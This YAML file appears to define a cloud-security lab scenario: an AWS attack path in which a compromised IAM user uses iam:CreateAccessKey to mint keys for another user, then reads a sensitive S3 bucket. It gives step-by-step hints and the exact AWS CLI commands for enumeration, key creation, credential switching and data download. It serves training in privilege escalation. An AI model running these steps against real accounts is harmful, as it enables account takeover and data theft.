attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-002-to-bucket-privesc-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:CreateAccessKey permission on pl-prod-iam-002-to-bucket-access-user,
        which has read and write access to a sensitive S3 bucket.

    - id: bucket-access-user
      label: "Bucket Access User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-002-to-bucket-access-user"
      description: >
        This IAM user has s3:GetObject and s3:PutObject permissions on the target
        S3 bucket. By creating new access keys for this user, you can operate as
        this principal and access the sensitive bucket contents.

    - id: target-bucket
      label: "Sensitive S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-prod-iam-002-to-bucket-{account_id}"
      description: >
        This S3 bucket contains sensitive data. The bucket access user has s3:GetObject
        and s3:PutObject permissions, allowing full read and write access to its contents.

  edges:
    - from: starting-principal
      to: bucket-access-user
      label: "iam:CreateAccessKey"
      description: >
        Create a new set of access keys for the bucket access user, gaining the ability
        to authenticate as that user and access the sensitive S3 bucket.
      hints:
        - "Start by confirming your identity and verifying that your starting user has no direct S3 access."
        - "Use your helpful IAM permissions to enumerate other users in the account and understand what they can do."
        - "Look at the policies attached to other users -- you're looking for a user with S3 bucket permissions."
        - "Once you've identified a user with data access, check whether your starting user can create credentials for them."
        - "You can mint long-lived programmatic credentials for another IAM user with a single API call -- no MFA required."
        - "Browse to https://pathfinding.cloud/paths/iam-002 for full technique details."
      commands:
        - description: "Verify starting user identity"
          command: "aws sts get-caller-identity --query 'Arn' --output text"
        - description: "List IAM users to find candidates with S3 access"
          command: "aws iam list-users --query 'Users[].UserName' --output table"
        - description: "Inspect policies attached to the bucket access user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-iam-002-to-bucket-access-user"
        - description: "Create access keys for the bucket access user"
          command: "aws iam create-access-key --user-name pl-prod-iam-002-to-bucket-access-user --output json"

    - from: bucket-access-user
      to: target-bucket
      label: "s3:GetObject, s3:PutObject"
      description: >
        Use the newly created credentials to access the sensitive S3 bucket and
        retrieve its contents.
      hints:
        - "Export the newly created access key and secret as environment variables to switch your AWS CLI context to the bucket access user."
        - "Wait a short time after creating the keys before using them -- AWS IAM credential propagation takes a few seconds."
        - "List the S3 buckets available to this user to find the target -- look for buckets matching the scenario naming pattern."
        - "Once you find the bucket, list its contents and retrieve the sensitive data file."
      commands:
        - description: "Configure the new credentials"
          command: "export AWS_ACCESS_KEY_ID=<new-key-id> && export AWS_SECRET_ACCESS_KEY=<new-secret> && unset AWS_SESSION_TOKEN"
        - description: "Confirm identity as the bucket access user"
          command: "aws sts get-caller-identity --query 'Arn' --output text"
        - description: "Find the target bucket"
          command: "aws s3api list-buckets --query \"Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name\" --output text"
        - description: "List objects in the sensitive bucket"
          command: "aws s3 ls s3://pl-prod-iam-002-to-bucket-{account_id}"
        - description: "Download the sensitive data file"
          command: "aws s3 cp s3://pl-prod-iam-002-to-bucket-{account_id}/sensitive-data.txt ."
